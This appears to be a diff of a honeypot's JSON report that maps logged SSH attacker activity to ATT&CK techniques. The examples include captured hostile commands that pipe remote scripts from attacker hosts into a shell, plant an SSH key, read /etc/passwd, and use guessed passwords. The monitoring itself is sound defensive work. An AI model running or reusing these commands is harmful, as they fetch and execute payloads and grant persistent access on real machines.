@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-24 04:00:44",
+  "generated": "2026-08-24 05:03:44",
   "totals": {
-    "commands": 73,
-    "login_failed": 219,
-    "login_success": 25,
-    "sessions": 270
+    "commands": 104,
+    "login_failed": 251,
+    "login_success": 33,
+    "sessions": 311
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 219,
+      "count": 251,
       "examples": [
         "root / 123456",
         "root / 12345678",
@@ -21,14 +21,14 @@
         "root / 1q2w3e4r"
       ],
       "first": "2026-08-24T00:00:38.589360Z",
-      "last": "2026-08-24T03:55:28.917192Z",
-      "unique_ips": 24
+      "last": "2026-08-24T05:02:16.445616Z",
+      "unique_ips": 31
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 25,
+      "count": 33,
       "examples": [
         "root / e10adc39",
         "ubuntu / ubuntu",
@@ -37,14 +37,14 @@
         "root / root"
       ],
       "first": "2026-08-24T00:20:02.041462Z",
-      "last": "2026-08-24T03:26:10.635423Z",
-      "unique_ips": 15
+      "last": "2026-08-24T04:48:23.902285Z",
+      "unique_ips": 22
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 11,
+      "count": 16,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -53,37 +53,51 @@
         "cd /tmp || cd /var/tmp || cd /; wget -q -O- http://176.65.139.196/bins/kla.sh | sh"
       ],
       "first": "2026-08-24T00:50:34.498920Z",
-      "last": "2026-08-24T01:48:00.340205Z",
-      "unique_ips": 2
+      "last": "2026-08-24T04:48:07.972319Z",
+      "unique_ips": 5
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 5,
+      "count": 6,
       "examples": [
         "uname -a",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-24T00:42:00.777388Z",
-      "last": "2026-08-24T02:00:04.192282Z",
-      "unique_ips": 4
+      "last": "2026-08-24T04:38:55.082307Z",
+      "unique_ips": 5
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 4,
+      "count": 6,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-24T00:50:33.416948Z",
-      "last": "2026-08-24T02:00:04.192282Z",
-      "unique_ips": 3
+      "last": "2026-08-24T04:23:03.253694Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "id"
+      ],
+      "first": "2026-08-24T02:00:04.192282Z",
+      "last": "2026-08-24T04:23:01.484402Z",
+      "unique_ips": 2
     },
     {
       "id": "T1059.004",
@@ -97,18 +111,6 @@
       "first": "2026-08-24T00:50:37.867683Z",
       "last": "2026-08-24T02:00:04.192282Z",
       "unique_ips": 2
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-08-24T02:00:04.192282Z",
-      "last": "2026-08-24T02:00:04.192282Z",
-      "unique_ips": 1
     },
     {
       "id": "T1037",
@@ -144,6 +146,18 @@
       ],
       "first": "2026-08-24T00:50:37.867683Z",
       "last": "2026-08-24T00:50:37.867683Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1087.001",
+      "name": "Account Discovery: Local Account",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "cat /etc/passwd"
+      ],
+      "first": "2026-08-24T04:23:01.489123Z",
+      "last": "2026-08-24T04:23:01.489123Z",
       "unique_ips": 1
     },
     {
@@ -186,19 +200,19 @@
     ],
     [
       "shell",
-      5
+      7
     ],
     [
       "sh",
-      4
+      6
     ],
     [
       "system",
-      3
+      5
     ],
     [
       "enable",
-      2
+      4
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
